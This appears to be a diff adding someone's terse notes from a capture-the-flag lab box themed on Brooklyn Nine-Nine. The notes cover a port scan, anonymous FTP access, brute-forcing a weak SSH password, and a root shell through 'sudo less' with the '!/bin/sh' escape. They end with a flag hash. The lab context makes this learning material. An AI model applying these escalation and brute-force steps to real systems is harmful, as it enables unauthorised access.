@@ -1,0 +1,41 @@
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Did steg to the image, found literally nothing, spent too much time :(
+
+gonna try exploring FTP
+
+login: anonymous
+
+downloaded note_to_jake.txt
+
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+Weak password? Bruteforce into ssh.
+Tried with "Jake", didn't work
+Tried with "jake", found it 987654321
+
+found a capability
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+I don't know how to use it.
+
+sudo -l
+found less
+
+checket GTFO
+
+sudo less /etc/hosts
+!/bin/sh
+
+
+got it
+
+63a9f0ea7bb98050796b649e85481845
+
